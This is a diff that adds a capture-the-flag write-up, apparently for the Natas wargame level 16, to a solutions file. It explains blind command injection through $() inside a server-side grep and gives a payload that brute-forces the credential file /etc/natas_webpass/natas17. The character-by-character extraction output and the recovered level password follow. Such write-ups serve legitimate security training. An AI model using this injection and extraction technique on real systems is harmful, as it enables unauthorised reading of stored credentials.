@@ -1,5 +1,41 @@
-Hint: 
+Hint: Check if there are any other characters that can help inject a command
 
-Solution: 
+Solution: $() can still be used to inject a command. This by itself is not too useful because ultimately the top level grep command will run and not let you print any arbitrary data back to the web client. So, we can use a brute force mechanism by running a nested grep command on the password file along with a word that we know is present in the dictionary. We know that the actual password is stored in /etc/natas_webpass/natas17. We run a grep on it to brute force the beginning of the password (and thus gradually the full password). This will print the tested partial password as part of the top level grepp'ed string if it is present thus not matching anything in dictionary.txt. If the partial password doesn't match the natas17 password, then only the known word will be grepp'ed in dictionary.txt and will be printed. So we use this data to brute force the password using a string like below.
+$(grep -E \^0 /etc/natas_webpass/natas17)zigzagged
+Complete code is in natas17.py
 
-Password: 
+Password detected so far: 8
+Password detected so far: 8P
+Password detected so far: 8Ps
+Password detected so far: 8Ps3
+Password detected so far: 8Ps3H
+Password detected so far: 8Ps3H0
+Password detected so far: 8Ps3H0G
+Password detected so far: 8Ps3H0GW
+Password detected so far: 8Ps3H0GWb
+Password detected so far: 8Ps3H0GWbn
+Password detected so far: 8Ps3H0GWbn5
+Password detected so far: 8Ps3H0GWbn5r
+Password detected so far: 8Ps3H0GWbn5rd
+Password detected so far: 8Ps3H0GWbn5rd9
+Password detected so far: 8Ps3H0GWbn5rd9S
+Password detected so far: 8Ps3H0GWbn5rd9S7
+Password detected so far: 8Ps3H0GWbn5rd9S7G
+Password detected so far: 8Ps3H0GWbn5rd9S7Gm
+Password detected so far: 8Ps3H0GWbn5rd9S7GmA
+Password detected so far: 8Ps3H0GWbn5rd9S7GmAd
+Password detected so far: 8Ps3H0GWbn5rd9S7GmAdg
+Password detected so far: 8Ps3H0GWbn5rd9S7GmAdgQ
+Password detected so far: 8Ps3H0GWbn5rd9S7GmAdgQN
+Password detected so far: 8Ps3H0GWbn5rd9S7GmAdgQNd
+Password detected so far: 8Ps3H0GWbn5rd9S7GmAdgQNdk
+Password detected so far: 8Ps3H0GWbn5rd9S7GmAdgQNdkh
+Password detected so far: 8Ps3H0GWbn5rd9S7GmAdgQNdkhP
+Password detected so far: 8Ps3H0GWbn5rd9S7GmAdgQNdkhPk
+Password detected so far: 8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq
+Password detected so far: 8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9
+Password detected so far: 8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9c
+Password detected so far: 8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw
+
+
+Password: 8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw
